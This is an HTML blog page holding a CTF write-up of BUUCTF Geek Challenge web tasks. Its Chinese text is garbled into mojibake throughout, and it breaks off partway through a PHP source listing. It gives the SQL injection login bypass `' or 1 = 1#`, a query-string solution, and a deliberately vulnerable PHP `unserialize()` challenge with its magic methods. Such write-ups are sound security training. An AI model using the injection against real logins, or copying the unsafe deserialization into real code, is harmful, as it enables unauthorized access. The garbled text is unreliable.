<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="è°­æ€»è¡¨ç¤ºå¯ä»¥å…ˆåˆ· BUU é‡Œçš„æå®¢å¤§æŒ‘æˆ˜ç³»åˆ—ï¼Œæ‰€ä»¥å°±æ¥è¿™é‡Œå¿«ä¹ä¸€ä¸‹ ç›®å‰å¯å…¬å¼€çš„æƒ…æŠ¥ï¼šï¼ˆå·²è§£å†³ğŸ˜‚ï¼‰  EasySQL Havefun PHP Secret File Knife LoveSQL Http BuyFlag BabySQL Upload HardSQL FinalSQL  0x00  EasySQLAnalysisè€ƒå¯Ÿé¡¹ï¼š SQLæ³¨å…¥ WriteUpåˆæ˜¯å¼€å¹•é›·å‡»ï¼Œåˆæ˜¯å¼€å¹•é›·å‡»ï¼å“å±å®">
<meta property="og:type" content="article">
<meta property="og:title" content="BUU-Webåˆ·é¢˜è®°å½• æå®¢å¤§æŒ‘æˆ˜">
<meta property="og:url" content="http://example.com/2020/02/27/BUU-Web%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95%20%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/index.html">
<meta property="og:site_name" content="Du1L0v3">
<meta property="og:description" content="è°­æ€»è¡¨ç¤ºå¯ä»¥å…ˆåˆ· BUU é‡Œçš„æå®¢å¤§æŒ‘æˆ˜ç³»åˆ—ï¼Œæ‰€ä»¥å°±æ¥è¿™é‡Œå¿«ä¹ä¸€ä¸‹ ç›®å‰å¯å…¬å¼€çš„æƒ…æŠ¥ï¼šï¼ˆå·²è§£å†³ğŸ˜‚ï¼‰  EasySQL Havefun PHP Secret File Knife LoveSQL Http BuyFlag BabySQL Upload HardSQL FinalSQL  0x00  EasySQLAnalysisè€ƒå¯Ÿé¡¹ï¼š SQLæ³¨å…¥ WriteUpåˆæ˜¯å¼€å¹•é›·å‡»ï¼Œåˆæ˜¯å¼€å¹•é›·å‡»ï¼å“å±å®">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2020-02-27T08:19:08.000Z">
<meta property="article:modified_time" content="2021-11-03T13:53:52.736Z">
<meta property="article:author" content="Du1L0v3">
<meta property="article:tag" content="Web">
<meta property="article:tag" content="BUUCTF">
<meta name="twitter:card" content="summary">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>BUU-Webåˆ·é¢˜è®°å½• æå®¢å¤§æŒ‘æˆ˜</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<!--
<link rel="stylesheet" href="//cdn.bootcss.com/highlight.js/9.2.0/styles/github.min.css">
<script src="//cdn.bootcss.com/highlight.js/9.2.0/highlight.min.js"></script>
<script>hljs.initHighlightingOnLoad();</script>
-->
<meta name="generator" content="Hexo 5.4.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" "Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Articles</a></li>
         
          <li><a href="/categories/">Categories</a></li>
         
          <li><a href="/search/">Search</a></li>
         
          <li><a href="/links/">Links</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a target="_blank" rel="noopener" href="https://github.com/duitutu">Projects</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post " href="/2020/03/23/%E7%AC%AC%E4%BA%8C%E5%B1%8A-BJDCTF-%E6%80%BB%E7%BB%93/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post " href="/2020/02/26/New-Puddle/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top " href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post " href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2020/02/27/BUU-Web%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95%20%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2020/02/27/BUU-Web%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95%20%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/&text=BUU-Webåˆ·é¢˜è®°å½• æå®¢å¤§æŒ‘æˆ˜"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2020/02/27/BUU-Web%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95%20%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/&title=BUU-Webåˆ·é¢˜è®°å½• æå®¢å¤§æŒ‘æˆ˜"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2020/02/27/BUU-Web%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95%20%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/&is_video=false&description=BUU-Webåˆ·é¢˜è®°å½• æå®¢å¤§æŒ‘æˆ˜"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=BUU-Webåˆ·é¢˜è®°å½• æå®¢å¤§æŒ‘æˆ˜&body=Check out this article: http://example.com/2020/02/27/BUU-Web%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95%20%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2020/02/27/BUU-Web%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95%20%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/&title=BUU-Webåˆ·é¢˜è®°å½• æå®¢å¤§æŒ‘æˆ˜"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2020/02/27/BUU-Web%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95%20%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/&title=BUU-Webåˆ·é¢˜è®°å½• æå®¢å¤§æŒ‘æˆ˜"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2020/02/27/BUU-Web%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95%20%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/&title=BUU-Webåˆ·é¢˜è®°å½• æå®¢å¤§æŒ‘æˆ˜"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2020/02/27/BUU-Web%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95%20%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/&title=BUU-Webåˆ·é¢˜è®°å½• æå®¢å¤§æŒ‘æˆ˜"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2020/02/27/BUU-Web%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95%20%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/&name=BUU-Webåˆ·é¢˜è®°å½• æå®¢å¤§æŒ‘æˆ˜&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2020/02/27/BUU-Web%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95%20%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/&t=BUU-Webåˆ·é¢˜è®°å½• æå®¢å¤§æŒ‘æˆ˜"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x00-EasySQL"><span class="toc-number">1.</span> <span class="toc-text">0x00  EasySQL</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Analysis"><span class="toc-number">1.1.</span> <span class="toc-text">Analysis</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WriteUp"><span class="toc-number">1.2.</span> <span class="toc-text">WriteUp</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-Havefun"><span class="toc-number">2.</span> <span class="toc-text">0x01 Havefun</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Analysis-1"><span class="toc-number">2.1.</span> <span class="toc-text">Analysis</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WriteUp-1"><span class="toc-number">2.2.</span> <span class="toc-text">WriteUp</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-PHP"><span class="toc-number">3.</span> <span class="toc-text">0x02 PHP</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Analysis-2"><span class="toc-number">3.1.</span> <span class="toc-text">Analysis</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WriteUp-2"><span class="toc-number">3.2.</span> <span class="toc-text">WriteUp</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#index-php"><span class="toc-number">3.2.0.0.1.</span> <span class="toc-text">index.php</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#class-php"><span class="toc-number">3.2.0.0.2.</span> <span class="toc-text">class.php</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#flag-php"><span class="toc-number">3.2.0.0.3.</span> <span class="toc-text">flag.php</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-Secret-File"><span class="toc-number">4.</span> <span class="toc-text">0x03 Secret File</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Analysis-3"><span class="toc-number">4.1.</span> <span class="toc-text">Analysis</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WriteUp-3"><span class="toc-number">4.2.</span> <span class="toc-text">WriteUp</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%AF%B7%E6%B1%82%EF%BC%9A"><span class="toc-number">4.2.0.0.1.</span> <span class="toc-text">è¯·æ±‚ï¼š</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%93%8D%E5%BA%94%EF%BC%9A"><span class="toc-number">4.2.0.0.2.</span> <span class="toc-text">å“åº”ï¼š</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04-Knife"><span class="toc-number">5.</span> <span class="toc-text">0x04 Knife</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Analysis-4"><span class="toc-number">5.1.</span> <span class="toc-text">Analysis</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WriteUp-4"><span class="toc-number">5.2.</span> <span class="toc-text">WriteUp</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x05-LoveSQL"><span class="toc-number">6.</span> <span class="toc-text">0x05 LoveSQL</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Analysis-5"><span class="toc-number">6.1.</span> <span class="toc-text">Analysis</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WriteUp-5"><span class="toc-number">6.2.</span> <span class="toc-text">WriteUp</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x06-Http"><span class="toc-number">7.</span> <span class="toc-text">0x06 Http</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Analysis-6"><span class="toc-number">7.1.</span> <span class="toc-text">Analysis</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WriteUp-6"><span class="toc-number">7.2.</span> <span class="toc-text">WriteUp</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x07-BuyFlag"><span class="toc-number">8.</span> <span class="toc-text">0x07 BuyFlag</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Analysis-7"><span class="toc-number">8.1.</span> <span class="toc-text">Analysis</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WriteUp-7"><span class="toc-number">8.2.</span> <span class="toc-text">WriteUp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Think"><span class="toc-number">8.3.</span> <span class="toc-text">Think</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x08-BabySQL"><span class="toc-number">9.</span> <span class="toc-text">0x08 BabySQL</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Analysis-8"><span class="toc-number">9.1.</span> <span class="toc-text">Analysis</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WriteUp-8"><span class="toc-number">9.2.</span> <span class="toc-text">WriteUp</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x09-Upload"><span class="toc-number">10.</span> <span class="toc-text">0x09 Upload</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Analysis-9"><span class="toc-number">10.1.</span> <span class="toc-text">Analysis</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WriteUp-9"><span class="toc-number">10.2.</span> <span class="toc-text">WriteUp</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x010-HardSQL"><span class="toc-number">11.</span> <span class="toc-text">0x010 HardSQL</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Analysis-10"><span class="toc-number">11.1.</span> <span class="toc-text">Analysis</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WriteUp-10"><span class="toc-number">11.2.</span> <span class="toc-text">WriteUp</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x011-FinalSQL"><span class="toc-number">12.</span> <span class="toc-text">0x011 FinalSQL</span></a></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        BUU-Webåˆ·é¢˜è®°å½• æå®¢å¤§æŒ‘æˆ˜
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">Du1L0v3</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2020-02-27T08:19:08.000Z" itemprop="datePublished">2020-02-27</time>
        
        (Updated: <time datetime="2021-11-03T13:53:52.736Z" itemprop="dateModified">2021-11-03</time>)
        
      
    </div>


      
    <div class="article-category">
        <i class="fas fa-archive"></i>
        <a class="category-link" href="/categories/WriteUp/">WriteUp</a>
    </div>


      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link-link" href="/tags/BUUCTF/" rel="tag">BUUCTF</a>, <a class="tag-link-link" href="/tags/Web/" rel="tag">Web</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <p>è°­æ€»è¡¨ç¤ºå¯ä»¥å…ˆåˆ· BUU é‡Œçš„æå®¢å¤§æŒ‘æˆ˜ç³»åˆ—ï¼Œæ‰€ä»¥å°±æ¥è¿™é‡Œå¿«ä¹ä¸€ä¸‹</p>
<p>ç›®å‰å¯å…¬å¼€çš„æƒ…æŠ¥ï¼šï¼ˆå·²è§£å†³ğŸ˜‚ï¼‰</p>
<ul>
<li><a href='# 0x00  EasySQL' style='color:black; text-decoration: none'>EasySQL</a></li>
<li><a href='# 0x01  Havefun' style='color:black; text-decoration: none'>Havefun</a></li>
<li><a href='# 0x02  PHP' style='color:black; text-decoration: none'>PHP</a></li>
<li><a href='# 0x03  Secret File' style='color:black; text-decoration: none'>Secret File</a></li>
<li><a href='# 0x04  Knife' style='color:black; text-decoration: none'>Knife</a></li>
<li><a href='# 0x05 LoveSQL' style='color:black; text-decoration: none'>LoveSQL</a></li>
<li><a href='# 0x06 Http' style='color:black; text-decoration: none'>Http</a></li>
<li><a href='# 0x07 BuyFlag' style='color:black; text-decoration: none'>BuyFlag</a></li>
<li><a href='# 0x08 BabySQL' style='color:black; text-decoration: none'>BabySQL</a></li>
<li><a href='# 0x09 Upload' style='color:black; text-decoration: none'>Upload</a></li>
<li><a href='# 0x010 HardSQL' style='color:black; text-decoration: none'>HardSQL</a></li>
<li><a href='# 0x011 FinalSQL' style='color:black; text-decoration: none'>FinalSQL</a></li>
</ul>
<h1 id="0x00-EasySQL"><a href="#0x00-EasySQL" class="headerlink" title="0x00  EasySQL"></a>0x00  EasySQL</h1><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p><strong>è€ƒå¯Ÿé¡¹ï¼š</strong> SQLæ³¨å…¥</p>
<h2 id="WriteUp"><a href="#WriteUp" class="headerlink" title="WriteUp"></a>WriteUp</h2><p>åˆæ˜¯å¼€å¹•é›·å‡»ï¼Œåˆæ˜¯å¼€å¹•é›·å‡»ï¼å“å±å®å®äº†ï¼Œä¸è¿‡ä¼Šç¦å…‹æ–¯é¢å…·è¿˜æ˜¯å¾ˆå¸…çš„ğŸ˜€</p>
<p>æ˜¯è®©æˆ‘ä»¬è¾“å…¥ç”¨æˆ·åå’Œå¯†ç ï¼Œé¢˜ç›®å·²ç»ç»™å‡ºäº†æç¤ºäº†ï¼Œè¿™é¢˜æ˜¯ä¸€é“ç®€å•çš„ SQL æ³¨å…¥</p>
<p>ç›´æ¥åœ¨ç”¨æˆ·åå¤„è¾“å…¥ <code>' or 1 = 1#</code> å°±å®Œäº‹äº†ï¼Œå¯†ç éšä¾¿è¾“è¾“å°±å¥½~~~</p>
<p>æœ€åå°±çˆ†å‡º flag å•¦ğŸ˜</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;a60963f7-b859-46fb-afb4-5f0d136e2e63&#125;</span><br></pre></td></tr></table></figure>

<h1 id="0x01-Havefun"><a href="#0x01-Havefun" class="headerlink" title="0x01 Havefun"></a>0x01 Havefun</h1><h2 id="Analysis-1"><a href="#Analysis-1" class="headerlink" title="Analysis"></a>Analysis</h2><p><strong>è€ƒå¯Ÿé¡¹ï¼š</strong> F12çš„ä½¿ç”¨ï¼ˆdogeï¼‰</p>
<h2 id="WriteUp-1"><a href="#WriteUp-1" class="headerlink" title="WriteUp"></a>WriteUp</h2><p>è¿™é¢˜è´¼èŒï¼Œç‚¹å¼€å¯ä»¥æ’¸çŒ«ğŸ˜„</p>
<p>é¦–å…ˆ F12 æ£€æŸ¥ä»£ç ï¼Œåœ¨åº•éƒ¨å‘ç°äº†ä¸€æ®µæ³¨é‡Š</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">        $cat=$_GET[&#x27;cat&#x27;];</span></span><br><span class="line"><span class="comment">        echo $cat;</span></span><br><span class="line"><span class="comment">        if($cat==&#x27;dog&#x27;)&#123;</span></span><br><span class="line"><span class="comment">            echo &#x27;Syc&#123;cat_cat_cat_cat&#125;&#x27;;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        --&gt;</span></span><br></pre></td></tr></table></figure>

<p>å¾ˆæ˜¾ç„¶ï¼Œæˆ‘ä»¬åªéœ€è¦ç”¨ GET ä¼ å…¥ä¸€ä¸ªå«åš cat çš„ï¼Œå€¼ä¸º â€˜dogâ€™ çš„å‚æ•°å°±è¡Œäº†</p>
<p>payloadï¼š<code>/?cat=dog</code></p>
<p>ç„¶åçˆ†å‡º flag ğŸ˜€</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;93feadc3-aefe-4b6d-945e-844cf5ee73c5&#125;</span><br></pre></td></tr></table></figure>

<h1 id="0x02-PHP"><a href="#0x02-PHP" class="headerlink" title="0x02 PHP"></a>0x02 PHP</h1><h2 id="Analysis-2"><a href="#Analysis-2" class="headerlink" title="Analysis"></a>Analysis</h2><p><strong>è€ƒå¯Ÿé¡¹ï¼š</strong> ä»£ç å®¡è®¡  |  PHP  |  ååºåˆ—åŒ–æ¼æ´</p>
<p><strong>å‚è€ƒé¡¹ï¼š</strong> <a target="_blank" rel="noopener" href='https://blog.csdn.net/qq_37133717/article/details/95768600' style='text-decoration:none'>PHPååºåˆ—åŒ–æ¼æ´</a></p>
<h2 id="WriteUp-2"><a href="#WriteUp-2" class="headerlink" title="WriteUp"></a>WriteUp</h2><p>ä¸€å¼€å¤´å°±çœ‹è§äº†ä¸€ä¸ªè¶…èŒçš„çŒ«ï¼ˆè™½ç„¶è¿™ä¸åº”è¯¥æ˜¯å…³æ³¨ç‚¹ï¼Œä½†æ˜¯â€¦â€¦æ€ä¹ˆè¯´å‘¢â€¦â€¦è™½ç„¶æœ‰ç‚¹æ²™é›•â€¦â€¦ä½†æ˜¯æˆ‘é€—å®ƒç©äº†å¥½ä¹…â€¦â€¦ï¼‰</p>
<p>å’³å’³ï¼Œè¨€å½’æ­£ä¼ ï¼Œé¡µé¢ä¸Šå·²ç»ç»™å‡ºäº†æç¤ºï¼š<code>å¤‡ä»½ç½‘ç«™</code>ï¼Œæ‰€ä»¥ç›´æ¥åŠ ä¸ª <a target="_blank" rel="noopener" href="http://www.zip/">www.zip</a> åç¼€è®¿é—®ä¸€ä¸‹å¾—åˆ°æºä»£ç æ–‡ä»¶</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">class.php</span><br><span class="line">flag.php</span><br><span class="line">index.js</span><br><span class="line">index.php</span><br><span class="line">style.css</span><br></pre></td></tr></table></figure>

<p>å…³æ³¨ç‚¹è‚¯å®šæ˜¯ä¸‰ä¸ª php æ–‡ä»¶å•¦ï¼Œåˆ†åˆ«æ‰“å¼€</p>
<h5 id="index-php"><a href="#index-php" class="headerlink" title="index.php"></a>index.php</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;class.php&#x27;</span>;</span><br><span class="line"><span class="variable">$select</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;select&#x27;</span>];</span><br><span class="line"><span class="variable">$res</span>=unserialize(@<span class="variable">$select</span>);</span><br><span class="line"><span class="meta">?&gt;</span>  <span class="comment">// å»æ‰æ— å…³ç´§è¦çš„ HTML éƒ¨åˆ†ä¹‹åï¼Œå‘ç°å­˜åœ¨ååºåˆ—åŒ–</span></span><br></pre></td></tr></table></figure>

<h5 id="class-php"><a href="#class-php" class="headerlink" title="class.php"></a>class.php</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);  <span class="comment">// å»é™¤æ‰€æœ‰é”™è¯¯è­¦å‘Š</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span> = <span class="string">&#x27;nonono&#x27;</span>;  <span class="comment">// æ³¨æ„æ˜¯ç§æœ‰å±æ€§</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span> = <span class="string">&#x27;yesyes&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;  <span class="comment">// é­”æœ¯å‡½æ•°ä¹‹ä¸€ï¼Œåœ¨ååºåˆ—åŒ–ä¹‹å‰è°ƒç”¨</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;password != <span class="number">100</span>) &#123;  <span class="comment">// password çš„å€¼å¿…é¡»ä¸º 100</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You name is: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;username;<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You password is: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;password;<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;username === <span class="string">&#x27;admin&#x27;</span>) &#123;  <span class="comment">// username å¿…é¡»ä¸º &#x27;admin&#x27;</span></span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line"></span><br><span class="line">            </span><br><span class="line">        